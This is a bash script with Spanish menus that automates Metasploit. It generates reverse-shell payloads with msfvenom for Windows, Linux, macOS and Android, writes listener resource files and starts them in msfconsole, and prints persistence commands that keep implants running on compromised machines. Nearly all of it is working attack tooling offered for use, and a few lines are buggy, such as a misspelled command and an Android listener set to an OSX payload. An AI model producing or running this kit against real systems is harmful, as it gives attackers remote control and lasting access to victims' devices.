#!/bin/bash
# etc etc etc
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Escritorio/temp 
clear
clear
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit servicio Encendido \E[1;33m:::::::::::::::::"
echo -e "\E[1;33m:::::: \e[97mScripts y payloads Guardados en ~/Escritorio/temp/ \E[1;33m::::::"
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "Presione [Enter] para Continuar..."
clear
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit automatisacion de  scripts \E[1;33m:::::::::::::::"
echo -e "\e[97m \e[97m '##::::'##:'########::'########:'########::'########:::::'###::::'##::::'##:'##::::'##::'######::
 ###::'###: ##.... ##: ##.....:: ##.... ##: ##.... ##:::'## ##::: ###::'###: ##:::: ##:'##... ##:
 ####'####: ##:::: ##: ##::::::: ##:::: ##: ##:::: ##::'##:. ##:: ####'####: ##:::: ##: ##:::..::
 ## ### ##: ##:::: ##: ######::: ########:: ########::'##:::. ##: ## ### ##: ##:::: ##:. ######::
 ##. #: ##: ##:::: ##: ##...:::: ##.. ##::: ##.. ##::: #########: ##. #: ##: ##:::: ##::..... ##:
 ##:.:: ##: ##:::: ##: ##::::::: ##::. ##:: ##::. ##:: ##.... ##: ##:.:: ##: ##:::: ##:'##::: ##:
 ##:::: ##: ########:: ########: ##:::. ##: ##:::. ##: ##:::: ##: ##:::: ##:. #######::. ######::
..:::::..::........:::........::..:::::..::..:::::..::..:::::..::..:::::..:::.......::::......:::
"
tput sgr0 # 
echo -e "\e[31m [ \e[97mSeleccione una Opcion Para Iniciar \e[31m]"
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::\e[97m[1] \e[90mPayload    \e[97m       [Crear un payload Con msfvenom]  \E[1;33m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;33m:::\e[97m[2] \e[32mEscucha      \e[97m     [Empezar un multi handler]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[3] \e[34mExploit     \e[97m      [Entrar en msfconsole]\E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[4] \e[95mPersistensia \e[97m     [Generar una secuencia de comandos para Persistencia] \E[1;33m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~~~ \e[31mMDerramus down 2600 \e[97m~~~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mLets Craft a PAYLOAD\E[1;33m:::::"

PS3='Elige tu Opcion o 6=Para salir: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Escritorio/temp/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/Escritorio/temp\E[1;33m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Escritorio/temp/shell.elf
            echo -e "\E[1;33m::::: \e[97mshell.elf saved to ~/Escritorio/temp\E[1;33m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Escritorio/temp/shell.macho
            echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/Escritorio/temp\E[1;33m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Escritorio/temp/shell.apk
            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/Escritorio/temp\E[1;33m:::::"
            ;;  
        "List_All")
            xterm -e msvenom -l &
            ;;   
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;33m::::: \e[97mLets Craft a LISTNER\E[1;33m:::::"

PS3='Elige tu Opcion o 6=Para salir: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            touch ~/Escritorio/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Escritorio/temp/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Escritorio/temp/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Escritorio/temp/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Escritorio/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Escritorio/temp/meterpreter.rc
            echo exploit -j -z >> ~/Escritorio/temp/meterpreter.rc
            cat ~/Escritorio/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Escritorio/temp/meterpreter.rc &
            ;;
        "Linux")
            touch ~/Escritorio/temp/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Escritorio/temp/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Escritorio/temp/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Escritorio/temp/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Escritorio/temp/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Escritorio/temp/meterpreter_linux.rc
            echo exploit -j -z >> ~/Escritorio/temp/meterpreter_linux.rc
            cat ~/Escritorio/temp/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Escritorio/temp/meterpreter_linux.rc &
            exit
            ;;
        "Mac")
            touch ~/Escritorio/temp/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Escritorio/temp/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Escritorio/temp/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Escritorio/temp/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Escritorio/temp/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Escritorio/temp/meterpreter_mac.rc
            echo exploit -j -z >> ~/Escritorio/temp/meterpreter_mac.rc
            cat ~/Escritorio/temp/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Escritorio/temp/meterpreter_mac.rc &
            ;;
        "Android")
            touch ~/Escritorio/temp/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Escritorio/temp/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Escritorio/temp/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Escritorio/temp/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Escritorio/temp/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Escritorio/temp/meterpreter_droid.rc
            echo exploit -j -z >> ~/Escritorio/temp/meterpreter_droid.rc
            cat ~/Escritorio/temp/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Escritorio/temp/meterpreter_droid.rc &
            ;;  
        "List_All")
            touch ~/Escritorio/temp/payloads.rc
            echo show payloads > ~/Escritorio/temp/payloads.rc
            cat ~/Escritorio/temp/payloads.rc
            xterm -e msfconsole -r ~/Escritorio/temp/payloads.rc &
            ;;   
        "Quit")
            echo "Hasta Pronto" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mStarting Metasploit \E[1;33m:::::"
  msfconsole
  use exploit/multi/handler  

;;


  "4" | "4" )
  # 
  echo -e "\E[1;33m::::: \e[97mPersistence Generator \E[1;33m:::::"
 PS3='Elige tu Opcion o 6=Para salir: '
 options=("Windows" "Linux" "Mac" "Android" "Quit")
 select opt in "${options[@]}"
 do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            echo -e "\E[1;33m::::: \e[97mrun persistence -U -X 30 -p $userport -r $uservar\E[1;33m:::::"
            ;;
        "Linux")
            echo -e "\E[1;33m::::: \e[97mGet creative here :)\E[1;33m:::::"
            ;;
        "Mac")
            echo 'Using directory /Applications/Utilities/'
            read -p 'Enter payload file name :example *shell.macho: ' uservar; 
            echo -e "\E[1;33m::::: \e[97mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[1;33m:::::"
            ;;
        "Android")
            touch ~/Escritorio/temp/android.sh
            echo \#\!/bin/bash >> ~/Escritorio/temp/android.sh
            echo while : >> ~/Escritorio/temp/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/Escritorio/temp/android.sh
            echo sleep 20 >> ~/Escritorio/temp/android.sh
            echo done >> ~/Escritorio/temp/android.sh
            cat ~/Escritorio/temp/android.sh
            echo -e "\E[1;33m::::: \e[97mandroid.sh saved to ~/Escritorio/temp. Upload to / on device\E[1;33m:::::" 
            ;;  
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 
esac

                                     # Reset colors to "normal."

echo

exit 0
